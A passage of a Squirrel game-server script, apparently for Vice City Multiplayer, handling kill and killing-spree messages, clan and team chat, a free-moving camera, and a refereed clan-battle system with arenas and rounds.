		if(status[player.ID].spree > 4) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" has ended their own killing spree of "+status[player.ID].spree+" kills in a row.");
		status[player.ID].spree = 0;

}

function spawnplr(p)
{
	local player = FindPlayer(p);
	if(player && !player.IsSpawned) player.Spawn();
}

function BodyPartText( bodypart )
{
    switch( bodypart )
    {
        case 0: return "Body";
        case 1: return "Torso";
        case 2: return "Left Arm";
        case 3: return "Right Arm";
        case 4: return "Left Leg";
        case 5: return "Right Leg";
        case 6: return "Head";
        case 7: return "Hit by a car";
        default: return "It's a mystery...";
    }
}
function onPlayerKill( killer, player, reason, bodypart )
{
	local killerName = pcol( killer.ID ) + killer.Name + white, playerName = pcol( player.ID ) + player.Name + white;
	Message( "[#FFDD33][Info][#FFFFFF] "+ killerName +" killed "+ playerName +" (" + GetWeaponName( reason ) + ") (" + BodyPartText( bodypart ) + ")" );
	if( CBattle.State == "STARTED" && CBattle.TPlayers.find( player.ID ) != null ) CBattle.PartCB( player ); 
	status[ killer.ID ].kills++;
	status[ killer.ID ].spree++;
	status[ player.ID ].deaths--;
	checkspree( killer.ID );
	if ( killer.Health <= 80 ) killer.Health += 20;
	else killer.Health = 100;
	if( status[player.ID].spree > 4 ) Message( "[#FFDD33]Information:[#FFFFFF] "+ pcol(player.ID)+player.Name+white +" has ended their own killing spree of "+ status[player.ID].spree +" kills in a row." );
    status[player.ID].spree = 0;

	SendDiscord(channel, "**"+killer.Name+"** killed **"+player.Name+"** (" + GetWeaponName( reason ) + ") (" + BodyPartText( bodypart ) + ")");
	
	if( _GG.Players.find( killer.ID ) != null )
	{
		miniroundkill(killer.ID);
	}
	if( _GG.Players.find( player.ID ) != null )
	{
		NewTimer("miniroundspawn", 8000, 1, player.ID);
	}


	if( _FR.Players.find(killer.ID) != null)
	{
		_FR.killFR(killer.ID, player.ID);
	}
	if( _FR.Players.find(player.ID) != null)
	{
		NewTimer("miniroundspawn", 8000, 1, player.ID);
		_FR.deathFR(player.ID);
	}

}

function onPlayerTeamKill( player, killer, reason, bodypart )
{
	if(status[player.ID].spree > 4) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(killer.ID)+killer.Name+ white+" has ended "+pcol(player.ID)+player.Name+white+" killing spree of "+status[player.ID].spree+" kills in a row.");
	status[player.ID].spree = 0;
	killer.Health = 0;
	Message("[#FFDD33]Information:[#FFFFFF] "+pol(killer.ID)+killer.Name+white+" Auto-Killed. Reason: Team Killing.");
	if(status[killer.ID].spree > 4) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(killer.ID)+killer.Name+white+" has ended their own killing spree of "+status[player.ID].spree+" kills in a row.");
	status[killer.ID].spree = 0;
}
function checkspree(p)
{
	local player = FindPlayer(p);
	if(player)
	{
		if(status[player.ID].spree == 5) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 10) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 15) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 20) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 25) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 30) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 35) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 40) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 45) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 50) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 55) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 60) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 65) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 70) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 75) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 80) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 85) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 90) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 95) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
		if(status[player.ID].spree == 100) Message("[#FFDD33]Information:[#FFFFFF] "+pcol(player.ID)+player.Name+white+" is on a killing spree of "+status[player.ID].spree+" kills in a row.");
	}
}

function onPlayerChat( player, text )
{
	if(text.slice(0,1) != "!" || text.slice(0,1) != "\\")
local message = text;
	local playerName = pcol(player.ID) + player.Name + white;
	if(message.slice(0,1) == "!" && status[player.ID].clan != null)
	{
		local arguments = GetTok(message, "!", NumTok(message, "!"));
		if(message.len() < 2)
		{
			MessagePlayer("[#FF0000]Error:[#FFFFFF] Use ![text]", player);
			return;
		}
		else
		{
			for(local i = 0; i <= GetMaxPlayers(); i++)
			{
				local plr = FindPlayer(i);
				if(plr && status[plr.ID].clan == status[player.ID].clan)
				{
					MessagePlayer("[#33DD33][CLAN CHAT] [#FFFFFF]"+playerName+": "+arguments, plr);
				}
			}
			for(local i = 0; i <= GetMaxPlayers(); i++)
			{
				local plr = FindPlayer(i);
				if(plr && status[plr.ID].Level == 6)
				MessagePlayer("[#FF00FF]Clan Chat "+playerName+": "+message, plr)
			}
			return;
		}
	}

	if(message.slice(0,1) == '\\')	
	{
		local text = message.slice(1);
		for ( local i = 0; i < GetMaxPlayers(); i++ )
		{
			local plr = FindPlayer( i );
			if ( plr && plr.Team == player.Team )
			{
				MessagePlayer("[#CC33CC][TEAM CHAT] [#FFFFFF]"+playerName+": "+arguments, plr);
			}
		}
			for(local i = 0; i <= GetMaxPlayers(); i++)
			{
				local plr = FindPlayer(i);
				if(plr && status[plr.ID].Level == 6)
				MessagePlayer("[#FF00FF]Team Chat "+pcol(player.ID)+player.Name+white+": "+message, plr)
			}
		return;
	}

return 1;
}






pCamera <- array( GetMaxPlayers() );

class CCamera
{
	function Pos() { return vPos; }
	function Target() { return vTarget; }
	function _typeof() { return "CCamera"; }
	function Remove() { this.clear(); }
	vPos = Vector( 0.0, 0.0, 0.0 );
	vTarget = Vector( 0.0, 0.0, 0.0 );
	fYaw = 0.0;
	fPitch = 0.0;
	fSpeed = 1.5;
	Player = null;
	bEnabled = false;
	bMovingForward = null;
	bMovingLeft = null;
	bMovingBackward = null;
	bMovingRight = null;
	bRotatingUp = null;
	bRotatingLeft = null;
	bRotatingDown = null;
	bRotatingRight = null;
}

function CCamera::Enable()
{
	vPos = Player.Pos;
	fPitch = 0.0;
	fYaw = 0.0;
	Rotate( -1 * Player.Angle * PI/180.0, 0.0 );
	Player.SetCameraPos( vPos, vTarget );
	Player.Frozen = true;
	bEnabled = true;
}

function CCamera::Disable()
{
	Player.Pos = vPos;
	Player.Frozen = false;
	Player.RestoreCamera();
	bEnabled = false;
}

function CCamera::Rotate( fHoriz, fVert )
{
	fYaw += fHoriz;
	fPitch += fVert;
	vTarget.x = vPos.x + cos( fPitch ) * sin( fYaw );
	vTarget.y = vPos.y + cos( fPitch ) * cos( fYaw );
	vTarget.z = vPos.z + sin( fPitch );
}

function CCamera::Move( fDist )
{
	vPos.x += fDist * cos( fPitch ) * sin( fYaw );
	vPos.y += fDist * cos( fPitch ) * cos( fYaw );
	vPos.z += fDist * sin( fPitch );
	Rotate( 0.0, 0.0 );
}

function CCamera::MoveSideways( fDist )
{
	vPos.x += fDist * cos( fPitch ) * sin( fYaw + PI/2 );
	vPos.y += fDist * cos( fPitch ) * cos( fYaw + PI/2 );
	Rotate( 0.0, 0.0 );
}

function CCamera::Process()
{
	local bMoving = false;
	local fCamSpeed = fSpeed;
	if ( bMovingForward )
	{
		Move( fCamSpeed );
		bMoving = true;
	}
	if ( bMovingBackward )
	{
		Move( -fCamSpeed );
		bMoving = true;
	}
	if ( bMovingLeft )
	{
		MoveSideways( -fCamSpeed );
		bMoving = true;
	}
	if ( bMovingRight )
	{
		MoveSideways( fCamSpeed );
		bMoving = true;
	}
	if ( bRotatingUp )
	{
		Rotate( 0.0, 0.1 );
		bMoving = true;
	}
	if ( bRotatingDown )
	{
		Rotate( 0.0, -0.1 );
		bMoving = true;
	}
	if ( bRotatingLeft )
	{
		Rotate( -0.1, 0.0 );
		bMoving = true;
	}
	if ( bRotatingRight )
	{
		Rotate( 0.1, 0.0 );
		bMoving = true;
	}
	if ( bMoving ) Player.SetCameraPos( vPos, vTarget );
}

function JoinArray( array, seperator )
{
  return array.reduce( function( prevData, nextData ){ return ( prevData + seperator + nextData ); } );
}



function onKeyDown( player, key )
{
	if( status[ player.ID ].Level == 4 && CBattle.State == "ON" )
	{
		if( CBattle.refereeSearch == true )
		{
			if( CBattle.selectedReferees[ player.ID ] == true )
			{
				if( key == KEY_Y )
				{
					if( player.IsSpawned )
					{
						if( TPTimeRunning[ player.ID ] == true ) MessagePlayer( "[#FF0000]Error:[#FFFFFF] You're already teleporting to the arena selection.", player );
						else
						{
							local plr = FindPlayer( CBattle.adminrequest );
							CBattle.V = 0;
							CBattle.refereeSearch = false;
							TPTimeRunning[ player.ID ] = true;
							CBS <- NewTimer( "ClanBattleSetup", 2000, 1, player.ID );
							MessagePlayer( "[#FFDD33]Information:[#FFFFFF] You had accepted the match to moderate. Teleporting to the arena selection...", player );
							MessagePlayer( "[#FFDD33]Information:[#FFFFFF] "+ pcol( player.ID ) + player.Name + white +" has accepted your request and its choosing the selected arena for the match.", plr );
							CBattle.Staff.push( player.ID );
							CBattle.iData[ player.ID ] = player.Pos;
							for( local i = 0; i <= GetMaxPlayers(); i++ )
							{
								local re = FindPlayer( i );
								if( ( re ) && ( CBattle.State == "ON" ) && ( CBattle.refereeSearch == true ) && ( CBattle.selectedReferees[ re.ID ] == true ) ) CBattle.selectedReferees[ re.ID ] = false;
							}
							CBattle.RAT = null;
							foreach( ID in CBattle.TPlayers )
							{
								local plrs = FindPlayer( ID );
								if( plrs )
								{
									plrs.IsFrozen = true;
									plrs.World = 2;
									plrs.Pos = clansloc;
								}
							}
							foreach( ID in CBattle.Staff )
							{
								local staff = FindPlayer( ID );
								if( staff ) staff.IsFrozen = true;
							}
							TPTimeRunning[ player.ID ] = false;
						}
					}
					else MessagePlayer( "[#FF0000]Error:[#FFFFFF] You must spawn before interacting with clan battles.", player );
				}
				else if( key == KEY_N )
				{
					if( player.IsSpawned )
					{
						MessagePlayer( "[#FFDD33]Information:[#FFFFFF] You've rejected the invitation. Other refeeres will deal with the situation.", player );
						CBattle.selectedReferees[ player.ID ] = false;
						CBattle.V--;
					}
					else MessagePlayer( "[#FF0000]Error:[#FFFFFF] You must spawn before interacting with clan battles.", player );
				}
			}
		}
		else
		{
			if( CBattle.Referee_Process == true )
			{
				//Positions of the camera of the arenas.
				if( key == KEY_LEFT )
				{
					if( CBattle.A == 1 ) CBattle.A = 5;
					else CBattle.A--;
				}
				else if( key == KEY_RIGHT )
				{
					if( CBattle.A == 5 ) CBattle.A = 1;
					else CBattle.A++;
				}
				else if( key == KEY_SPACEBAR )
				{
					CBArenaTimer.Delete();
					player.Widescreen = false;
					player.RestoreCamera();
					CBattle.Referee_Process = false;
					for( local i = 0; i <= GetMaxPlayers(); i++ )
					{
						local plr = FindPlayer( i );
						if( ( plr ) && ( plr.World == 2 ) )
						{
							plr.IsFrozen = false;
							MessagePlayer( "[#FFDD33]Information:[#FFFFFF] "+ pcol( player.ID ) + player.Name + white +" has chosen the arena, "+ bas + CBattle.ArenaName[CBattle.A] + white +", for the battle.\nClan leaders, you've given authority to select your subboardinates using "+ bas + "/selectsub" + white +" &, for the rest, use "+ bas + "/ready" + white +" once your leader selected all three subboardinates.", plr );
						}
					}
					CBattle.Sub_Process = true;
				}
			}
		}
	}
	if( CBattle.State == "STARTED" && ( CBattle.Staff.find( player.ID ) != null || CBattle.CPOSubs.find( player.ID ) != null || CBattle.CPTSubs.find( player.ID ) != null || CBattle.Spectators.find( player.ID ) != null ) )
	{
		if( key == KEY_LEFT )
		{
			if( CBattle.I == 0 ) CBattle.I = 2;
			else CBattle.I--;
			if( CBattle.A == 1 ) player.SetCameraPos( LocBFCameraPositions.CamerasPos[CBattle.I], LocBFCameraPositions.CameraLookPos );
			else if( CBattle.A == 2 ) player.SetCameraPos( LocArmyCameraPositions.CamerasPos[CBattle.I], LocArmyCameraPositions.CameraLookPos );
			else if( CBattle.A == 3 ) player.SetCameraPos( LocDocksCameraPositions.CamerasPos[CBattle.I], LocDocksCameraPositions.CameraLookPos );
			else if( CBattle.A == 4 ) player.SetCameraPos( LocPLCameraPositions.CamerasPos[CBattle.I], LocPLCameraPositions.CameraLookPos );
			else if( CBattle.A == 5 ) player.SetCameraPos( LocLegendCameraPositions.CamerasPos[CBattle.I], LocLegendCameraPositions.CameraLookPos );
		}
		else if( key == KEY_RIGHT )
		{
			if( CBattle.I == 2 ) CBattle.I = 0;
			else CBattle.I++;
			if( CBattle.A == 1 ) player.SetCameraPos( LocBFCameraPositions.CamerasPos[CBattle.I], LocBFCameraPositions.CameraLookPos );
			else if( CBattle.A == 2 ) player.SetCameraPos( LocArmyCameraPositions.CamerasPos[CBattle.I], LocArmyCameraPositions.CameraLookPos );
			else if( CBattle.A == 3 ) player.SetCameraPos( LocDocksCameraPositions.CamerasPos[CBattle.I], LocDocksCameraPositions.CameraLookPos );
			else if( CBattle.A == 4 ) player.SetCameraPos( LocPLCameraPositions.CamerasPos[CBattle.I], LocPLCameraPositions.CameraLookPos );
			else if( CBattle.A == 5 ) player.SetCameraPos( LocLegendCameraPositions.CamerasPos[CBattle.I], LocLegendCameraPositions.CameraLookPos );
		}
	}
	if( pCamera[ player.ID ].bEnabled == true )
	{
		switch( key )
		{
			case KEY_W:
				pCamera[ player.ID ].bMovingForward = true;
				break;
			case KEY_A:
				pCamera[ player.ID ].bMovingLeft = true;
				break;
			case KEY_S:
				pCamera[ player.ID ].bMovingBackward = true;
				break;
			case KEY_D:
				pCamera[ player.ID ].bMovingRight = true;
				break;
			case KEY_UP:
				pCamera[ player.ID ].bRotatingUp = true;
				break;
			case KEY_LEFT:
				pCamera[ player.ID ].bRotatingLeft = true;
				break;
			case KEY_DOWN:
				pCamera[ player.ID ].bRotatingDown = true;
				break;
			case KEY_RIGHT:
				pCamera[ player.ID ].bRotatingRight = true;
				break;
		}
	}
}

function onKeyUp( player, key )
{
	if( pCamera[ player.ID ].bEnabled == true )
	{
		switch( key )
		{
			case KEY_W:
				pCamera[ player.ID ].bMovingForward = false;
				break;
			case KEY_A:
				pCamera[ player.ID ].bMovingLeft = false;
				break;
			case KEY_S:
				pCamera[ player.ID ].bMovingBackward = false;
				break;
			case KEY_D:
				pCamera[ player.ID ].bMovingRight = false;
				break;
			case KEY_UP:
				pCamera[ player.ID ].bRotatingUp = false;
				break;
			case KEY_LEFT:
				pCamera[ player.ID ].bRotatingLeft = false;
				break;
			case KEY_DOWN:
				pCamera[ player.ID ].bRotatingDown = false;
				break;
			case KEY_RIGHT:
				pCamera[ player.ID ].bRotatingRight = false;
				break;
		}
	}
}



function FindRandPlayer()
{
 local
     MAX_PLAYERS = 100,
     count = 0,
     buffer = "",
     param;

     for(local i = 0; i < MAX_PLAYERS; i++)
     {
       if ( FindPlayer( i ) ) 
  {
   buffer = buffer + " " + i;
   count++;
  }
     }

 param = split(buffer, " ");
 return param[ rand() % count ];
}





CBattle <- {
	Timer1 = null,
	Timer2 = null,
	FC_Alive = 0, // First clan players remaining alive.
	SC_Alive = 0, // Second clan players remaining alive.
	Round = 1, // Above, you can compare the rounds to the required one.
	TPlayers = [], // Total players in the clan battle.
	ClanPlayers_One = [], // Total playeres in the first clan of the clan battle.
	ClanTags = [], // Clans tags for usage.
	CPOSubs = [], // First clan's substitutes during the match by their names.
	ClanPlayers_Two = [], // Total players in the second clan on the clan battle.
	CPTSubs = [], // Second clan's substitutes during the match by their names.
	Staff = [], // Total players in terms of staff.
	Spectators = [], // Random players spectating the game.
	A = 1, // Arena ID.
	ArenaName = [ "None", "Location BF", "Army Base", "Docks", "Parking Lot", "Building Top" ],
	I = 0, // Integer to help loop through each scene of the arena.
	V = 0, // The amount of votes casted by the referees.
	CV = 0, // The amount of votes casted by players to start the battle.
	CVD = array( GetMaxPlayers(), false ), // A  boolean to determine whether the participant voted or not.
	FC_Score = 0, // First clan's score.
	SC_Score = 0, // Second clan's score.
	RAT = null, // The timer set for the referee scouting function.
	iData = array( GetMaxPlayers(), null ),
	State = "OFF",
	refereeSearch = false, // Varible to determine that a referee search is in progress.
	Referee_Process = false, // The process to determine referees are selecting an arena.
	Sub_Process = false, // The process to determine clan leaders selecting 3 subboardinates.
	RProcess = false, // Variable to determine players that they're ready to start the clan battle.
	selectedReferees = array( GetMaxPlayers(), false ),
	MatchEnded = false,
	adminrequest = null, // The admin who requested the clan battle.
	tempadmin = null, // In cases when the admins leaves the game and never comes back, the referee is given the admin access temporarily until the match ends.
	function SearchRefereeOnline( player )
	{
		State = "ON";
		local playerName = pcol( player.ID ) + player.Name + white, success = false;
		MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Searching for an referee online. Please wait for a few moments...", player );
		refereeSearch = true;
		for( local i = 0; i <= GetMaxPlayers(); i++ )
		{
			local plr = FindPlayer( i );
			if( ( plr ) && ( status[ plr.ID ].Level == 4 ) )
			{
				MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Dear referee, "+ playerName +" is requesting you to moderate the match.", plr );
				MessagePlayer( "[#FFDD33]Information:[#FFFFFF] To accept it, press [#FFDD33]Y[#FFFFFF] to confirm it; if you're currently busy, press [#FFDD33]N[#FFFFFF] to deny it & allow another referee to do it.", plr );
				selectedReferees[ plr.ID ] = true;
				success = true;
				V++;
			}
		}
		if( success == false )
		{
			MessagePlayer( "[#FF0000]Error:[#FFFFFF] We're terribly sorry, but their is no referees/admins available in the server. Please try again later. Take care, sir/ma'm.", player );
			refereeSearch = false;
			State = "OFF";
			RAT = null;
			TPlayers.clear();
			ClanPlayers_One.clear();
			ClanPlayers_Two.clear();
			ClanTags.clear();
			Staff.clear();
			adminrequest = null;
		}
	}
	function CBRStart( stage = 1 )
	{
		if( stage == 1 )
		{	
			foreach( ID in TPlayers )
			{
				local plr = FindPlayer( ID );
				if( plr )
				{
					if( A == 1 )
					{
						if( ClanPlayers_One.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != FirstCPosLocBF[ FC_Alive ] ) plr.Pos = FirstCPosLocBF[ FC_Alive ];
							FC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						else if( ClanPlayers_Two.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != SecondCPosLocBF[ SC_Alive ] ) plr.Pos = SecondCPosLocBF[ SC_Alive ];
							SC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						SetSpectators();
						CBAnnounce();
					}
					else if( A == 2 )
					{
						if( ClanPlayers_One.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != FirstCPosLocArmy[ FC_Alive ] ) plr.Pos = FirstCPosLocArmy[ FC_Alive ];
							FC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						else if( ClanPlayers_Two.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != SecondCPosLocArmy[ SC_Alive ] ) plr.Pos = SecondCPosLocArmy[ SC_Alive ];
							SC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						CBAnnounce();
					}
					else if( A == 3 )
					{
						if( ClanPlayers_One.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != FirstCPosLocDocks[ FC_Alive ] ) plr.Pos = FirstCPosLocDocks[ FC_Alive ];
							FC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						else if( ClanPlayers_Two.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != SecondCPosLocDocks[ SC_Alive ] ) plr.Pos = SecondCPosLocDocks[ SC_Alive ];
							SC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						CBAnnounce();
					}
					else if( A == 4 )
					{
						if( ClanPlayers_One.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != FirstCPosLocParkingLot[ FC_Alive ] ) plr.Pos = FirstCPosLocParkingLot[ FC_Alive ];
							FC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						else if( ClanPlayers_Two.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != SecondCPosLocParkingLot[ SC_Alive ] ) plr.Pos = SecondCPosLocParkingLot[ SC_Alive ];
							SC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						CBAnnounce();
					}
					else if( A == 5 )
					{
						if( ClanPlayers_One.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != FirstCPosLocLegend[ FC_Alive ] ) plr.Pos = FirstCPosLocLegend[ FC_Alive ];
							FC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						else if( ClanPlayers_Two.find( plr.ID ) != null )
						{
							plr.IsFrozen = true;
							if( plr.Pos != SecondCPosLocLegend[ SC_Alive ] ) plr.Pos = SecondCPosLocLegend[ SC_Alive ];
							SC_Alive++;
							plr.Widescreen = true;
							plr.SetCameraPos( MainCamera.CameraPos, MainCamera.CameraLookPos );
						}
						CBAnnounce();
					}
					MessagePlayer( "[#FFDD33]Information:[#FFFFFF] Clan leaders, you've access to "+bas+"/callsub"+white+" to call a substitution to occur at this screen. Note that you've 10 seconds left.", plr );
				}
			}
			SetSpectators();
		}
		else if( stage == 2 )
		{
			MatchEnded = false;
			foreach( ID in TPlayers )
			{
				local plr = FindPlayer( ID );
				if( ( plr ) && ( ClanPlayers_One.find( plr.ID  ) != null || ClanPlayers_Two.find( plr.ID ) != null  ) )
				{
					plr.Widescreen = false;
					plr.RestoreCamera();
				}
			}
		}
		else if( stage == 3 )
		{
			foreach( ID in TPlayers )
			{
				local plr = FindPlayer( ID );
				if( ( plr ) && ( ClanPlayers_One.find( plr.ID  ) != null || ClanPlayers_Two.find( plr.ID ) != null  ) )
				{
					plr.IsFrozen = false;
					plr.CanAttack = true;
				}
			}
		}
	}
	function PartCB( player, eliminated = 1 )
	{	
		if( eliminated )
		{
			if( ClanPlayers_One.find( player.ID ) != null ) FC_Alive--;
			else if( ClanPlayers_Two.find( player.ID ) != null ) SC_Alive--;
			Message( "[#FFDD33]Information:[#FFFFFF] "+ pcol( player.ID ) + player.Name + white +" has been eliminated from the round. "+ (FC_Alive + SC_Alive) +" left in the match." );
			CBWinner();
		}
		else 
		{
			Message( "[#FFDD33]Information:[#FFFFFF] "+ pcol( player.ID ) + player.Name + white +" has left the clan battle." );
			if( TPlayers.find( player.ID ) != null )
			{
				if( ClanPlayers_One.find( player.ID ) != null )
				{
					ClanPlayers_One.remove( ClanPlayers_One.find( player.ID ) );
					if( CBattle.State == "STARTED" ) FC_Alive--;
				}
				else if( ClanPlayers_Two.find( player.ID ) != null )
				{
					ClanPlayers_Two.remove( ClanPlayers_Two.find( player.ID ) );
					if( CBattle.State == "STARTED" ) SC_Alive--;
				}
				TPlayers.remove( TPlayers.find( player.ID ) );
			}
			else if( Staff.find( player.ID ) != null )
			{
				Staff.remove( Staff.find( player.ID ) );
				
				local r = 0, a = 0;
				foreach( ID in Staff )
				{
					local staffplr = FindPlayer( ID );
					if( ( staffplr ) && ( status[ staffplr.ID ].Level < 5 ) ) r++;
					else a++;
				}
				if( ( r == 0 || a == 0 ) && State == "STARTED" && ( !Timer1 || !Timer2 ) ) CBPause( 0 );
			}
			else if( Spectators.find( player.ID ) != null ) Spectators.remove( Spectators.find( player.ID ) );
			else if( CPOSubs.find( player.ID ) != null ) CPOSubs.remove( CPOSubs.find( player.ID ) );
			else if( CPTSubs.find( player.ID ) != null ) CPTSubs.remove( CPTSubs.find( player.ID ) );
			player.RestoreCamera();
			player.Widescreen = false;
			player.IsOnRadar = true;
			player.IsFrozen = false;
			player.World = 1;
			player.Pos = iData[ player.ID ];
		}
	} 
	function CBWinner()
	{
		if( FC_Alive == 0 )
		{
			if( Round != RequiredRounds )
			{
				Message( "[#FFDD33]Information:[#FFFFFF] "+ ClanTags[1] +" clan has won round "+ Round +"!" );
				SC_Score++;
				Round++;
				FC_Alive = 0;
				SC_Alive = 0;
				MatchEnded = true;
				CBRStartCallTimer();
			}
			else
			{
				Message( "[#FFDD33]Information:[#FFFFFF] "+ ClanTags[1] +" clan has officially won the clan battle!" );
				for( local i = 0; i <= GetMaxPlayers(); i++ )
				{
					local plr = FindPlayer( i );
					if( plr )
					{
						plr.RestoreCamera();
						plr.Widescreen = false;
						plr.IsOnRadar = true;
						plr.IsFrozen = false;
						plr.World = 1;
						plr.Pos = iData[ plr.ID ]; 
					}
				}
				State = "OFF";
				ClanPlayers_One.clear();
				ClanPlayers_Two.clear();
				CPOSubs.clear();
				CPTSubs.clear();
				Staff.clear();
				Spectators.clear();
				TPlayers.clear();
				adminrequest = null;
				A = 1;
				I = 0;
				if( CBattle.tempadmin )
				{
					local ref = FindPlayer( CBattle.tempadmin );
					status[ ref.ID ].Level = 4; 
				}
				SC_Alive = 0;
				SC_Score = 0;
				FC_Score = 0;
				Round = 1;
			}
		}
		else if( SC_Alive == 0 )
		{
			if( Round != RequiredRounds )
			{
				Message( "[#FFDD33]Information:[#FFFFFF] "+ ClanTags[0] +" clan has won round "+ Round +"!" );
				FC_Score++;
				Round++;
				FC_Alive = 0;
				SC_Alive = 0;
				MatchEnded = true;
				CBRStartCallTimer();
			}
			else
			{
				Message( "[#FFDD33]Information:[#FFFFFF] "+ ClanTags[0] +" clan has officially won the clan battle!" );
				for( local i = 0; i <= GetMaxPlayers(); i++ )
				{
					local plr = FindPlayer( i );
					if( plr )
					{
						plr.RestoreCamera();
						plr.Widescreen = false;
						plr.IsFrozen = false;
						plr.IsOnRadar = true;
						plr.World = 1;
						plr.Pos = iData[ plr.ID ]; 
					}
				}
				State = "OFF";
				ClanPlayers_One.clear();
				ClanPlayers_Two.clear();
				CPOSubs.clear();
				CPTSubs.clear();
				Staff.clear();
				Spectators.clear();
				TPlayers.clear();
				adminrequest = null;
				A = 1;
				I = 0;
				if( CBattle.tempadmin )
				{
					local ref = FindPlayer( CBattle.tempadmin );
					status[ ref.ID ].Level = 4; 
				}
				FC_Alive = 0;
				SC_Score = 0;
				FC_Score = 0;
				Round = 1;
			}
		}
		else return 0;
	}
}

function CBAnnounce()
{
	foreach( ID in CBattle.TPlayers )
	{
		local cplr = FindPlayer( ID );
		if( cplr )
		{
			::Announce( ""+ CBattle.ClanTags[0] +" vs. "+ CBattle.ClanTags[1] +"", cplr, 7 );
			::Announce( "Round "+ CBattle.Round +" \x10Score: "+ CBattle.FC_Score +" : "+ CBattle.SC_Score +"", cplr, 8 );
		}
	}
	foreach( ID in CBattle.Staff )
	{
		local staffplr = FindPlayer( ID );
		if( staffplr )
		{
			::Announce( ""+ CBattle.ClanTags[0] +" vs. "+ CBattle.ClanTags[1] +"", staffplr, 7 );
			::Announce( "Round "+ CBattle.Round +" \x10Score: "+ CBattle.FC_Score +" : "+ CBattle.SC_Score +"", staffplr, 8 );
		}
	}
}

function SetSpectators()
{
	for( local i = 0; i <= GetMaxPlayers(); i++ )
	{
		local plr = FindPlayer( i );
